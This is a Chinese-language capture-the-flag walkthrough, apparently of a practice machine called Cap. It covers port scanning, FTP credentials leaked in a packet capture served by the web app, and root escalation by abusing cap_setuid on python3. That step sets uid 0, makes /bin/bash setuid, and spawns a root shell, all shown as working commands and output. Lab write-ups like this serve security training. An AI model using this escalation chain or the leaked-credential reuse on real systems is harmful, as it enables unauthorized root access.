# 信息收集

**端口扫描**

```
┌──(root㉿MJ)-[/tmp/test]
└─# nmap --min-rate 10000 -p- 10.129.18.65
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 12:40 CST
Nmap scan report for 10.129.18.65
Host is up (0.27s latency).
Not shown: 65460 closed tcp ports (reset), 72 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 35.86 seconds
```
可以看到开放21（ftp），22（ssh）以及80端口

**详细版本识别**

```
┌──(root㉿MJ)-[/tmp/test]
└─# nmap -sV -sC -O -p21,22,80 10.129.18.65
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 12:45 CST
Nmap scan report for 10.129.18.65
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.28 seconds
```
vsftpd这个版本只有个dos的漏洞，利用价值不大


## ftp
先尝试匿名登录，这是对ftp初步信息收集的最好方法

```
┌──(root㉿MJ)-[/tmp/test]
└─# ftp 10.129.18.65
Connected to 10.129.18.65.
220 (vsFTPd 3.0.3)
Name (10.129.18.65:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
ftp>
```
不允许匿名登录，转向web收集信息

## web
最终在`http://10.129.18.65/data/0`发现有ftp凭据泄露的流量包文件
可以找到这段数据
```
USER nathan

331 Please specify the password.

PASS Buck3tH4TF0RM3!
```
 密码复用尝试登录nathan用户，可以拿到立足点

# 提权

```
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
nathan@cap:~$ sudo -l
[sudo] password for nathan:
Sorry, user nathan may not run sudo on cap.
nathan@cap:~$
```
可以看到没有什么特别权限以及权限组

其实看app.py的源码时就能关注到
```
command = f"""python3 -c 'import os; os.setuid(0); os.system("timeout 5 tcpdump -w {path} -i any host {ip}")'"""
```
在代码中调用外部命令，设置uid，这是很神奇的操作，按理说web的master不应该具有这么大的权限，可以改uid

```
nathan@cap:/var/www$ python3 -c 'import os; os.setuid(0);os.system("chmod +s /bin/bash");'
nathan@cap:/var/www$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
nathan@cap:/var/www$ bash -p
bash-5.0# id
uid=1001(nathan) gid=1001(nathan) euid=0(root) egid=0(root) groups=0(root),1001(nathan)
```
可以看到猜想是正确的，原理如下

## cap_setuid 的力量

传统的 SUID 提权是粗暴的（整个程序以 Root 身份运行），而利用 `cap_setuid` 提权则是**在程序执行过程中，动态地将自身权限提升为 Root**。

```
bash-5.0# getcap /usr/bin/python3.8
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
可以看到的确是被赋予了这个能力，不过这里用的是python3进行的提权

```
bash-5.0# ls -al /usr/bin/python3
lrwxrwxrwx 1 root root 9 Mar 13  2020 /usr/bin/python3 -> python3.8
```
也很明确，是个链接而已



